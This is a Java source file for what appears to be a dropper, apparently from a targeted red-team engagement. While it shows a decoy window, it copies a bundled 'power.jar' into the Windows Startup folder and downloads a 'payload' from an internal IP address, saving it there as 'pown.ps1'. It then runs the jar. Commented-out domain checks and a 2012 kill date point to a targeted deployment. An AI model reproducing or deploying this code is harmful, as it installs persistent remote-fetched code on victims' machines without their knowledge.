/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
//package javaapplication1;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.*;
import java.util.*;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.awt.event.ActionEvent;
import java.net.URL;

public class JavaApplication1 {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {

	//String domainName = ReadEnv.GetVar("USERDOMAIN");


	//List<String> validDomainNames = new ArrayList<String>();
	//validDomainNames.add("AP2");
	//validDomainNames.add("NL");

	//if (!validDomainNames.contains(domainName.toUpperCase())) {
	//    return;
	//}


	//no injections after 29 June
	Date date = new Date();
	if (date.after(new Date(2012 - 1900, 05, 29))) {
	    //return;
	}

	final MainForm form = new MainForm();
	form.setVisible(true);

	try {
	    String homePath = ReadEnv.GetVar("USERPROFILE");
	    String appdata = ReadEnv.GetVar("appdata");


	    String os = System.getProperty("os.name").toLowerCase();
	    String installPath;
	    String installPath2;
	    if (os.indexOf("windows xp") > -1) {
			installPath = homePath + "\\Start Menu\\Programs\\Startup\\power.jar";
			installPath2 = homePath + "\\Start Menu\\Programs\\Startup\\pown.ps1";
	    } else {
			installPath = appdata + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\power.jar";
			installPath2 = appdata + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pown.ps1";
	    }
// write power jar to start up folder 
	    FileOutputStream output = new FileOutputStream(installPath);
	    InputStream stream = JavaApplication1.class.getResourceAsStream("resources/power.jar");
	    byte[] bytes = new byte[stream.available()];
	    int nrBytes = 0;
	    do {
		nrBytes += stream.read(bytes, nrBytes, stream.available());
	    } while (stream.available() > 0);
///* disable injection 
	    output.write(bytes, 0, nrBytes);
	    output.flush();
 //*/
	    output.close();
	    
// download powersjell script en schrijf naar disk

// URL parameter
	    
            URL url = new URL("http://192.168.1.12/payload");
            // Get an input stream for reading
            InputStream in = url.openStream();
            // Create a buffered input stream for efficency
            BufferedInputStream bufIn = new BufferedInputStream(in);
            File outputFile = new File(installPath2);
            OutputStream out =
                    new BufferedOutputStream(new FileOutputStream(outputFile));
            byte[] buffer = new byte[2048];
            for (;;)  {
                int nBytes = bufIn.read(buffer);
                if (nBytes <= 0) break;
                out.write(buffer, 0, nBytes);
            }
            out.flush();
            out.close();
            in.close();

	    	    

	    File systemCheckerDir = new File(appdata + "\\SystemChecker");
	    if (!systemCheckerDir.exists()) {
		systemCheckerDir.mkdir();
	    }

	      
	    Runtime.getRuntime().exec("javaw -jar \"" + installPath + "\"");

	} catch (IOException e) {
	    //JOptionPane.showConfirmDialog(form, e.getMessage(), "Something went wrong", JOptionPane.ERROR_MESSAGE);
	}
    }
}
